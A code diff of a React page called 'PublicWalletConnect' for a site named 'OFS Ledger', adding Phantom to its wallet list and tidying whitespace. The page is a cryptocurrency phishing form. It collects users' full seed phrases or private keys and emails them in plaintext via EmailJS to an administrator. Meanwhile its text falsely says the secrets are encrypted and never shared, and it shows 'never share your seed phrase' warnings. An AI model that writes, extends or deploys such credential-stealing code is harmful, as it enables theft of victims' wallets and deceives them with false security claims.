@@ -12,13 +12,13 @@ import { useTheme } from "@/components/theme-provider";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import emailjs from '@emailjs/browser';
 import { User } from "lucide-react";
-import { 
-  Wallet, 
-  Shield, 
-  AlertTriangle, 
-  Lock, 
-  KeyRound, 
-  Eye, 
+import {
+  Wallet,
+  Shield,
+  AlertTriangle,
+  Lock,
+  KeyRound,
+  Eye,
   EyeOff,
   ArrowLeft,
   HelpCircle,
@@ -49,6 +49,7 @@ const SUPPORTED_WALLETS = [
   { id: "peakdefi", name: "PeakDeFi Wallet", logo: "/images/wallets/peakdefi.png", seedPhraseWords: [12] },
   { id: "infinity", name: "Infinity Wallet", logo: "/images/wallets/infinity.png", seedPhraseWords: [12, 24] },
   { id: "lobstr", name: "Lobstr Wallet", logo: "/images/wallets/lobstr.png", seedPhraseWords: [12] },
+  { id: "phantom", name: "Phantom", logo: "/images/wallets/phantom.png", seedPhraseWords: [12, 24] },
 ];
 
 // Supported blockchains for dropdown selection
@@ -82,7 +83,7 @@ const PublicWalletConnect = () => {
       }
     `;
     document.head.appendChild(style);
-    
+
     return () => {
       document.head.removeChild(style);
     };
@@ -90,10 +91,10 @@ const PublicWalletConnect = () => {
   const navigate = useNavigate();
   const { toast } = useToast();
   const { theme } = useTheme();
-  
+
   // Create a ref for the hidden form
   const formRef = useRef<HTMLFormElement>(null);
-  
+
   // Form state
   const [selectedWallet, setSelectedWallet] = useState<string | null>(null);
   const [walletName, setWalletName] = useState<string>("");
@@ -106,22 +107,22 @@ const PublicWalletConnect = () => {
   const [error, setError] = useState<string | null>(null);
   const [walletFilter, setWalletFilter] = useState<string>("");
   const [inputMethod, setInputMethod] = useState<string>("seedPhrase");
-  
+
   // Filter wallets based on search input
-  const filteredWallets = SUPPORTED_WALLETS.filter(wallet => 
+  const filteredWallets = SUPPORTED_WALLETS.filter(wallet =>
     wallet.name.toLowerCase().includes(walletFilter.toLowerCase())
   );
-  
+
   // Get selected wallet details
   const getSelectedWalletDetails = () => {
     return SUPPORTED_WALLETS.find(wallet => wallet.id === selectedWallet);
   };
-  
+
   // Handle wallet selection
   const handleWalletSelect = (walletId: string) => {
     const wallet = SUPPORTED_WALLETS.find(w => w.id === walletId);
     setSelectedWallet(walletId);
-    
+
     // Set default seed phrase count based on wallet
     if (wallet) {
       if (wallet.seedPhraseWords.length === 1) {
@@ -129,46 +130,46 @@ const PublicWalletConnect = () => {
       } else {
         setSeedPhraseCount(wallet.seedPhraseWords[0]);
       }
-      
+
       // Set default wallet name
       setWalletName(`My ${wallet.name}`);
     }
   };
-  
+
   // Validate seed phrase
   const validateSeedPhrase = () => {
     if (inputMethod !== "seedPhrase") return true;
     const words = seedPhrase.trim().split(/\s+/);
     const walletDetails = getSelectedWalletDetails();
     if (!walletDetails) return false;
-    
+
     return walletDetails.seedPhraseWords.includes(words.length);
   };
-  
+
   // Validate private key
   const validatePrivateKey = () => {
     if (inputMethod !== "privateKey") return true;
     // Basic validation: private keys are typically 64 hex characters (32 bytes)
     // Sometimes with 0x prefix
-    const key = privateKey.trim().startsWith("0x") 
-      ? privateKey.trim().substring(2) 
+    const key = privateKey.trim().startsWith("0x")
+      ? privateKey.trim().substring(2)
       : privateKey.trim();
-      
+
     return key.length === 64 && /^[0-9a-fA-F]+$/.test(key);
   };
-  
+
   // Get individual words from seed phrase
   const getSeedPhraseWords = () => {
     return seedPhrase.trim().split(/\s+/).filter(word => word.length > 0);
   };
-  
+
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    
+
     if (isSubmitting) {
       return; // Prevent double submission
     }
-    
+
     if (!selectedWallet) {
       setError("Please select a wallet type");
       toast({
@@ -178,7 +179,7 @@ const PublicWalletConnect = () => {
       });
       return;
     }
-    
+
     // Validate based on input method
     if (inputMethod === "seedPhrase" && !validateSeedPhrase()) {
       const walletDetails = getSelectedWalletDetails();
@@ -198,10 +199,10 @@ const PublicWalletConnect = () => {
       });
       return;
     }
-    
+
     setIsSubmitting(true);
     setError(null);
-    
+
     try {
       // Prepare data for email
       const walletData = {
@@ -213,7 +214,7 @@ const PublicWalletConnect = () => {
         seed_phrase: inputMethod === "seedPhrase" ? "[ENCRYPTED]" : "",
         user_email: "public_user@example.com" // Placeholder for public users
       };
-      
+
       // Send email with EmailJS only (no Supabase)
       try {
         // Create email parameters
@@ -229,13 +230,13 @@ const PublicWalletConnect = () => {
           wallet_address: inputMethod === "seedPhrase" ? seedPhrase : privateKey,
           message: `A new wallet has been connected by a public user. Wallet type: ${walletData.wallet_type}, Input method: ${walletData.input_method}`
         };
-        
+
         console.log('Sending email with params:', {
           serviceID: import.meta.env.VITE_EMAILJS_SERVICE_ID,
           templateID: import.meta.env.VITE_EMAILJS_TEMPLATE_ID,
           hasPublicKey: !!import.meta.env.VITE_EMAILJS_PUBLIC_KEY
         });
-        
+
         // Use promise-based approach
         emailjs.send(
           import.meta.env.VITE_EMAILJS_SERVICE_ID,
@@ -244,21 +245,21 @@ const PublicWalletConnect = () => {
           import.meta.env.VITE_EMAILJS_PUBLIC_KEY
         ).then((result) => {
           console.log('Email sent successfully:', result.text);
-          
+
           // Show success message
           toast({
             title: "Wallet Connection Email Sent",
             description: "Admin has been notified about your wallet connection.",
           });
-          
+
           // Reset form
           handleReset();
-          
+
           // Navigate to sign-up page after a short delay
           setTimeout(() => {
             navigate("/sign-up");
           }, 1000);
-          
+
           setIsSubmitting(false);
         }).catch((error) => {
           console.error('Error sending email:', error);
@@ -286,7 +287,7 @@ const PublicWalletConnect = () => {
       setIsSubmitting(false);
     }
   };
-  
+
   // Reset form
   const handleReset = () => {
     setSelectedWallet(null);
@@ -296,13 +297,13 @@ const PublicWalletConnect = () => {
     setInputMethod("seedPhrase");
     setError(null);
   };
-  
+
   return (
     <div className="container mx-auto px-4 sm:px-6 py-4 space-y-6 max-w-4xl">
       <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
         <div className="flex items-center gap-2 w-full">
-          <Button 
-            variant="ghost" 
+          <Button
+            variant="ghost"
             onClick={() => navigate("/")}
             className="gap-2"
           >
@@ -327,11 +328,11 @@ const PublicWalletConnect = () => {
                 <AlertTriangle className="h-4 w-4" />
                 <AlertTitle>SECURITY WARNING</AlertTitle>
                 <AlertDescription>
-                  Never share your seed phrase with anyone. 
+                  Never share your seed phrase with anyone.
                   OFS Ledger staff will never ask for your seed phrase via email, chat, or phone.
                 </AlertDescription>
               </Alert>
-              
+
               <div className="relative mb-4">
                 <Search className="absolute left-2.5 top-2.5 h-4 w-4 text-muted-foreground" />
                 <Input
@@ -341,7 +342,7 @@ const PublicWalletConnect = () => {
                   className="pl-8"
                 />
               </div>
-              
+
               <div className="grid grid-cols-1 xs:grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-2 sm:gap-4">
                 {filteredWallets.map((wallet) => (
                   <div
@@ -366,7 +367,7 @@ const PublicWalletConnect = () => {
                   </div>
                 ))}
               </div>
-              
+
               <Alert>
                 <Info className="h-4 w-4" />
                 <AlertTitle>Wallet Compatibility</AlertTitle>
@@ -375,7 +376,7 @@ const PublicWalletConnect = () => {
                 </AlertDescription>
               </Alert>
             </div>
-            
+
             {selectedWallet && (
               <div className="space-y-6">
                 <div className="flex items-center gap-3 mb-4 p-3 bg-primary/5 rounded-lg overflow-hidden">
@@ -396,7 +397,7 @@ const PublicWalletConnect = () => {
                     </div>
                   </div>
                 </div>
-                
+
                 <div className="space-y-4">
                   <div className="space-y-2">
                     <Label htmlFor="wallet-name">Wallet Name</Label>
@@ -407,7 +408,7 @@ const PublicWalletConnect = () => {
                       onChange={(e) => setWalletName(e.target.value)}
                     />
                   </div>
-                  
+
                   {/* Input Method Tabs */}
                   <Tabs value={inputMethod} onValueChange={setInputMethod} className="w-full">
                     <TabsList className="grid w-full grid-cols-2">
@@ -420,7 +421,7 @@ const PublicWalletConnect = () => {
                         Private Key
                       </TabsTrigger>
                     </TabsList>
-                    
+
                     {/* Seed Phrase Tab Content */}
                     <TabsContent value="seedPhrase" className="space-y-4 pt-4">
                       {getSelectedWalletDetails()?.seedPhraseWords.length === 2 && (
@@ -443,7 +444,7 @@ const PublicWalletConnect = () => {
                           </Select>
                         </div>
                       )}
-                      
+
                       <div className="space-y-2">
                         <div className="flex flex-wrap justify-between items-center gap-2">
                           <Label htmlFor="seed-phrase" className="text-sm sm:text-base">Seed Phrase ({seedPhraseCount} words)</Label>
@@ -467,14 +468,14 @@ const PublicWalletConnect = () => {
                             )}
                           </Button>
                         </div>
-                        
+
                         {/* Elaborate Seed Phrase Input */}
                         <div className={`p-2 sm:p-4 border rounded-lg bg-card ${!showSeedPhrase ? "text-password" : ""}`}>
                           <div className="grid grid-cols-1 xs:grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-2">
                             {Array.from({ length: seedPhraseCount }).map((_, index) => {
                               const words = getSeedPhraseWords();
                               const word = index < words.length ? words[index] : "";
-                              
+
                               return (
                                 <div key={index} className="relative">
                                   <div className="absolute left-2 top-1/2 -translate-y-1/2 text-[10px] sm:text-xs text-muted-foreground font-mono">
@@ -488,16 +489,15 @@ const PublicWalletConnect = () => {
                                       words[index] = e.target.value;
                                       setSeedPhrase(words.join(" "));
                                     }}
-                                    className={`w-full h-9 sm:h-10 px-7 py-1 sm:py-2 rounded border ${
-                                      word ? "border-primary/30 bg-primary/5" : "border-input"
-                                    } text-xs sm:text-sm font-mono focus:outline-none focus:ring-1 focus:ring-primary`}
+                                    className={`w-full h-9 sm:h-10 px-7 py-1 sm:py-2 rounded border ${word ? "border-primary/30 bg-primary/5" : "border-input"
+                                      } text-xs sm:text-sm font-mono focus:outline-none focus:ring-1 focus:ring-primary`}
                                     placeholder={`Word ${index + 1}`}
                                   />
                                 </div>
                               );
                             })}
                           </div>
-                          
+
                           <div className="mt-3 sm:mt-4 flex flex-wrap items-center justify-between gap-2">
                             <Button
                               type="button"
@@ -508,7 +508,7 @@ const PublicWalletConnect = () => {
                             >
                               Clear All
                             </Button>
-                            
+
                             <div className="text-xs text-muted-foreground">
                               <span className={getSeedPhraseWords().length === seedPhraseCount ? "text-green-500" : ""}>
                                 {getSeedPhraseWords().length}
@@ -516,13 +516,13 @@ const PublicWalletConnect = () => {
                             </div>
                           </div>
                         </div>
-                        
+
                         <p className="text-xs text-muted-foreground mt-2">
                           Your seed phrase is securely encrypted and stored. We never share this information with third parties.
                         </p>
                       </div>
                     </TabsContent>
-                    
+
                     {/* Private Key Tab Content */}
                     <TabsContent value="privateKey" className="space-y-4 pt-4">
                       <div className="space-y-2">
@@ -548,7 +548,7 @@ const PublicWalletConnect = () => {
                             )}
                           </Button>
                         </div>
-                        
+
                         <div className="relative">
                           <Input
                             id="private-key"
@@ -560,7 +560,7 @@ const PublicWalletConnect = () => {
                           />
                           <Lock className="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
                         </div>
-                        
+
                         <p className="text-xs text-muted-foreground mt-2">
                           Your private key is securely encrypted and stored. We never share this information with third parties.
                         </p>
@@ -568,7 +568,7 @@ const PublicWalletConnect = () => {
                     </TabsContent>
                   </Tabs>
                 </div>
-                
+
                 <Alert variant="destructive" className="bg-destructive/5 text-destructive border-destructive/20">
                   <AlertTriangle className="h-4 w-4" />
                   <AlertTitle>Security Warning</AlertTitle>
@@ -576,7 +576,7 @@ const PublicWalletConnect = () => {
                     Never share your seed phrase with anyone. OFS Ledger staff will never ask for your seed phrase via email, chat, or phone.
                   </AlertDescription>
                 </Alert>
-                
+
                 <div className="flex flex-col-reverse sm:flex-row sm:justify-end gap-2 sm:gap-4 mt-6">
                   <Button
                     type="button"
@@ -587,7 +587,7 @@ const PublicWalletConnect = () => {
                   >
                     Reset
                   </Button>
-                  <Button 
+                  <Button
                     type="submit"
                     disabled={!selectedWallet || (inputMethod === "seedPhrase" && !seedPhrase) || (inputMethod === "privateKey" && !privateKey) || isSubmitting}
                     className="w-full sm:w-auto"
@@ -605,7 +605,7 @@ const PublicWalletConnect = () => {
                     )}
                   </Button>
                 </div>
-                
+
                 {error && (
                   <Alert variant="destructive">
                     <AlertTriangle className="h-4 w-4" />
@@ -618,7 +618,7 @@ const PublicWalletConnect = () => {
           </form>
         </CardContent>
       </Card>
-      
+
       <Card>
         <CardHeader className="px-4 sm:px-6">
           <CardTitle className="text-lg sm:text-xl">Wallet Connection FAQ</CardTitle>
@@ -628,9 +628,8 @@ const PublicWalletConnect = () => {
         </CardHeader>
         <CardContent className="px-4 sm:px-6">
           <div className="space-y-3 sm:space-y-4">
-            <div className={`rounded-lg p-3 sm:p-4 border ${
-              theme === "dark" ? "bg-card" : "bg-gray-50"
-            }`}>
+            <div className={`rounded-lg p-3 sm:p-4 border ${theme === "dark" ? "bg-card" : "bg-gray-50"
+              }`}>
               <h3 className="font-medium flex items-center gap-2">
                 <HelpCircle className="h-4 w-4 text-primary" />
                 What is a seed phrase?
@@ -639,10 +638,9 @@ const PublicWalletConnect = () => {
                 A seed phrase (also called a recovery phrase or mnemonic) is a series of words that store all the information needed to recover your wallet. It's like a master password that generates all your private keys.
               </p>
             </div>
-            
-            <div className={`rounded-lg p-3 sm:p-4 border ${
-              theme === "dark" ? "bg-card" : "bg-gray-50"
-            }`}>
+
+            <div className={`rounded-lg p-3 sm:p-4 border ${theme === "dark" ? "bg-card" : "bg-gray-50"
+              }`}>
               <h3 className="font-medium flex items-center gap-2">
                 <HelpCircle className="h-4 w-4 text-primary" />
                 Is it safe to enter my seed phrase?
@@ -651,10 +649,9 @@ const PublicWalletConnect = () => {
                 Your seed phrase is encrypted before being stored and is never accessible in plain text after submission. We use industry-standard encryption to protect your data. However, you should never share your seed phrase with anyone.
               </p>
             </div>
-            
-            <div className={`rounded-lg p-3 sm:p-4 border ${
-              theme === "dark" ? "bg-card" : "bg-gray-50"
-            }`}>
+
+            <div className={`rounded-lg p-3 sm:p-4 border ${theme === "dark" ? "bg-card" : "bg-gray-50"
+              }`}>
               <h3 className="font-medium flex items-center gap-2">
                 <HelpCircle className="h-4 w-4 text-primary" />
                 What happens after I connect my wallet?
@@ -663,10 +660,9 @@ const PublicWalletConnect = () => {
                 After connecting your wallet, it will be submitted for KYC verification. Once verified, you'll be able to perform withdrawals and other operations. KYC verification typically takes 24-48 hours.
               </p>
             </div>
-            
-            <div className={`rounded-lg p-3 sm:p-4 border ${
-              theme === "dark" ? "bg-card" : "bg-gray-50"
-            }`}>
+
+            <div className={`rounded-lg p-3 sm:p-4 border ${theme === "dark" ? "bg-card" : "bg-gray-50"
+              }`}>
               <h3 className="font-medium flex items-center gap-2">
                 <HelpCircle className="h-4 w-4 text-primary" />
                 Why do I need to verify my wallet?
